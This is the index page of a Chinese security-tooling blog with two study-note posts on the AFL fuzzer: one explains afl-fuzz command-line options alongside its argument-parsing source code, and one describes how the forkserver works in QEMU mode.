<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"oneshell.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":true,"nav":{"gitalk":{"order":-2}},"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="菜">
<meta property="og:type" content="website">
<meta property="og:title" content="OneShell">
<meta property="og:url" content="https://oneshell.top/index.html">
<meta property="og:site_name" content="OneShell">
<meta property="og:description" content="菜">
<meta property="og:locale">
<meta property="article:author" content="OneShell">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://oneshell.top/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-Hans'
  };
</script>

  <title>OneShell</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">OneShell</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">I fight for a brighter tomorrow</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/afl%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="菜">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/13/afl%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E/" class="post-title-link" itemprop="url">afl命令参数说明</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-13 09:56:47 / Modified: 09:58:12" itemprop="dateCreated datePublished" datetime="2023-04-13T09:56:47+08:00">2023-04-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/AFL/" itemprop="url" rel="index"><span itemprop="name">AFL</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="AFL-命令参数说明"><a href="#AFL-命令参数说明" class="headerlink" title="AFL 命令参数说明"></a>AFL 命令参数说明</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz 2.52b by &lt;lcamtuf@google.com&gt;</span><br><span class="line"></span><br><span class="line">afl-fuzz [ options ] -- /path/to/fuzzed_app [ ... ]</span><br><span class="line"></span><br><span class="line">Required parameters:</span><br><span class="line"></span><br><span class="line">  -i dir        - input directory with test cases</span><br><span class="line">  -o dir        - output directory for fuzzer findings</span><br><span class="line"></span><br><span class="line">Execution control settings:</span><br><span class="line"></span><br><span class="line">  -f file       - location read by the fuzzed program (stdin)</span><br><span class="line">  -t msec       - timeout for each run (auto-scaled, 50-1000 ms)</span><br><span class="line">  -m megs       - memory limit for child process (50 MB)</span><br><span class="line">  -Q            - use binary-only instrumentation (QEMU mode)</span><br><span class="line">  -U            - use Unicorn-based instrumentation (Unicorn mode)</span><br><span class="line"></span><br><span class="line">Fuzzing behavior settings:</span><br><span class="line"></span><br><span class="line">  -d            - quick &amp; dirty mode (skips deterministic steps)</span><br><span class="line">  -n            - fuzz without instrumentation (dumb mode)</span><br><span class="line">  -x dir        - optional fuzzer dictionary (see README)</span><br><span class="line"></span><br><span class="line">Other stuff:</span><br><span class="line"></span><br><span class="line">  -T text       - text banner to show on the screen</span><br><span class="line">  -M / -S id    - distributed mode (see parallel_fuzzing.txt)</span><br><span class="line">  -C            - crash exploration mode (the peruvian rabbit thing)</span><br><span class="line"></span><br><span class="line">For additional tips, please consult /usr/local/share/doc/afl/README.</span><br></pre></td></tr></table></figure>

<p>必须的参数：</p>
<ul>
<li>-i：输入文件夹路径，里面有基本的测试样例</li>
<li>-o：afl 的输出文件夹路径</li>
</ul>
<p>额外控制选项：</p>
<ul>
<li>-f：被 fuzz 的程序从何处读取输入，默认是从 stdin 中读取</li>
<li>-t：每一轮模糊测试的超时时间</li>
<li>-m：fuzz fork 出来的子进程的内存限制</li>
<li>-Q：Qemu 模式启动，可以用来 fuzz 其他架构的程序</li>
<li>-u：unicorn 模式，没有怎么用过</li>
</ul>
<p>fuzz 行为设定：</p>
<ul>
<li>-d：quick &amp; dirty 模式，没有使用过</li>
<li>-n：dumb mode，同样没有使用过</li>
<li>-x dir：额外的 fuzzer 目录，没有使用过</li>
</ul>
<p>其他的设定：</p>
<ul>
<li>t：banner 的设定</li>
<li>-M：分布式相关的设定，或者说是并行 fuzz</li>
<li>-C：crash 探索模式</li>
</ul>
<p>这些命令参数的使用目前自己也还不大熟练，对于命令参数的解析在 afl-fuzz.c 的 main 函数中的第一个循环内，如下，可以看出参数的设定并不止帮助提示中的那些：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;+i:o:f:m:b:t:T:dnCB:S:M:x:QV&quot;</span>)) &gt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>: <span class="comment">/* input dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_dir) FATAL(<span class="string">&quot;Multiple -i options not supported&quot;</span>);</span><br><span class="line">        in_dir = optarg;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, <span class="string">&quot;-&quot;</span>)) in_place_resume = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>: <span class="comment">/* output dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_dir) FATAL(<span class="string">&quot;Multiple -o options not supported&quot;</span>);</span><br><span class="line">        out_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 这个地方不知道是用来做什么的 */</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123; <span class="comment">/* master sync ID */</span></span><br><span class="line"></span><br><span class="line">          u8* c;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (sync_id) FATAL(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">          sync_id = ck_strdup(optarg);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((c = <span class="built_in">strchr</span>(sync_id, <span class="string">&#x27;:&#x27;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">            *c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sscanf</span>(c + <span class="number">1</span>, <span class="string">&quot;%u/%u&quot;</span>, &amp;master_id, &amp;master_max) != <span class="number">2</span> ||</span><br><span class="line">                !master_id || !master_max || master_id &gt; master_max ||</span><br><span class="line">                master_max &gt; <span class="number">1000000</span>) FATAL(<span class="string">&quot;Bogus master ID passed to -M&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          force_deterministic = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>: </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sync_id) FATAL(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">        sync_id = ck_strdup(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>: <span class="comment">/* target file */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_file) FATAL(<span class="string">&quot;Multiple -f options not supported&quot;</span>);</span><br><span class="line">        out_file = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>: <span class="comment">/* dictionary */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (extras_dir) FATAL(<span class="string">&quot;Multiple -x options not supported&quot;</span>);</span><br><span class="line">        extras_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>: &#123; <span class="comment">/* timeout */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (timeout_given) FATAL(<span class="string">&quot;Multiple -t options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u%c&quot;</span>, &amp;exec_tmout, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) FATAL(<span class="string">&quot;Bad syntax used for -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (exec_tmout &lt; <span class="number">5</span>) FATAL(<span class="string">&quot;Dangerously low value of -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (suffix == <span class="string">&#x27;+&#x27;</span>) timeout_given = <span class="number">2</span>; <span class="keyword">else</span> timeout_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>: &#123; <span class="comment">/* mem limit */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit_given) FATAL(<span class="string">&quot;Multiple -m options not supported&quot;</span>);</span><br><span class="line">          mem_limit_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(optarg, <span class="string">&quot;none&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            mem_limit = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%llu%c&quot;</span>, &amp;mem_limit, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) FATAL(<span class="string">&quot;Bad syntax used for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">switch</span> (suffix) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: mem_limit *= <span class="number">1024</span> * <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>: mem_limit *= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>: mem_limit /= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:  FATAL(<span class="string">&quot;Unsupported suffix or bad syntax for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit &lt; <span class="number">5</span>) FATAL(<span class="string">&quot;Dangerously low value of -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">sizeof</span>(<span class="type">rlim_t</span>) == <span class="number">4</span> &amp;&amp; mem_limit &gt; <span class="number">2000</span>)</span><br><span class="line">            FATAL(<span class="string">&quot;Value of -m out of range on 32-bit systems&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>: &#123; <span class="comment">/* bind CPU core */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (cpu_to_bind_given) FATAL(<span class="string">&quot;Multiple -b options not supported&quot;</span>);</span><br><span class="line">          cpu_to_bind_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u&quot;</span>, &amp;cpu_to_bind) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) FATAL(<span class="string">&quot;Bad syntax used for -b&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: <span class="comment">/* skip deterministic */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (skip_deterministic) FATAL(<span class="string">&quot;Multiple -d options not supported&quot;</span>);</span><br><span class="line">        skip_deterministic = <span class="number">1</span>;</span><br><span class="line">        use_splicing = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: <span class="comment">/* load bitmap */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This is a secret undocumented option! It is useful if you find</span></span><br><span class="line"><span class="comment">           an interesting test case during a normal fuzzing process, and want</span></span><br><span class="line"><span class="comment">           to mutate it without rediscovering any of the test cases already</span></span><br><span class="line"><span class="comment">           found during an earlier run.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           To use this mode, you need to point -B to the fuzz_bitmap produced</span></span><br><span class="line"><span class="comment">           by an earlier run for the exact same binary... and that&#x27;s it.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           I only used this once or twice to get variants of a particular</span></span><br><span class="line"><span class="comment">           file, so I&#x27;m not making this an official setting. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_bitmap) FATAL(<span class="string">&quot;Multiple -B options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">        in_bitmap = optarg;</span><br><span class="line">        read_bitmap(in_bitmap);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: <span class="comment">/* crash mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (crash_mode) FATAL(<span class="string">&quot;Multiple -C options not supported&quot;</span>);</span><br><span class="line">        crash_mode = FAULT_CRASH;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>: <span class="comment">/* dumb mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dumb_mode) FATAL(<span class="string">&quot;Multiple -n options not supported&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_DUMB_FORKSRV&quot;</span>)) dumb_mode = <span class="number">2</span>; <span class="keyword">else</span> dumb_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: <span class="comment">/* banner */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (use_banner) FATAL(<span class="string">&quot;Multiple -T options not supported&quot;</span>);</span><br><span class="line">        use_banner = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>: <span class="comment">/* QEMU mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (qemu_mode) FATAL(<span class="string">&quot;Multiple -Q options not supported&quot;</span>);</span><br><span class="line">        qemu_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!mem_limit_given) mem_limit = MEM_LIMIT_QEMU;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>: <span class="comment">/* Show version number */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Version number has been printed already, just quit. */</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">        usage(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/afl%20qemu%20mode%E4%B8%AD%E5%85%B3%E4%BA%8Eforkserver%E7%9A%84%E4%BD%9C%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="菜">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/13/afl%20qemu%20mode%E4%B8%AD%E5%85%B3%E4%BA%8Eforkserver%E7%9A%84%E4%BD%9C%E7%94%A8/" class="post-title-link" itemprop="url">afl qemu mode中关于forkserver的作用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-13 09:53:28 / Modified: 09:55:20" itemprop="dateCreated datePublished" datetime="2023-04-13T09:53:28+08:00">2023-04-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/AFL/" itemprop="url" rel="index"><span itemprop="name">AFL</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="afl-qemu-mode-中关于-forkserver-作用"><a href="#afl-qemu-mode-中关于-forkserver-作用" class="headerlink" title="afl qemu-mode 中关于 forkserver 作用"></a>afl qemu-mode 中关于 forkserver 作用</h1><p>之前在看 afl 源码，粗略看了大概，没有对判断逻辑仔细查看。我原本理解的 afl 创建目标程序进程的方式为：afl-fuzz 父进程先通过 init_forkserver 创建一个 forkserver 子进程，然后对于每次新产生的变异数据，都在 forkserver 进程中通过 fork 创建子进程，通过之前 dup2 函数将变异数据传递到目标程序进程的标准输入，再 execv 加载目标程序，进行执行。</p>
<p>在 runtarget 函数中，只有当如下标志被设置了，才会使用上面描述的每次 fork 一个子进程，再 execve 这种每次需要额外花费进程生命周期（创建-&gt;执行-&gt;销毁）的方式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dumb_mode == <span class="number">1</span> || no_forkserver) </span><br></pre></td></tr></table></figure>

<p>afl 采用的 forkserver 技术，实际上是只进行一次 execve 函数执行，之后对于目标程序进程，是通过写时拷贝技术从已经停止的目标程序进程直接拷贝进程镜像，这样就节约了大量的性能。</p>
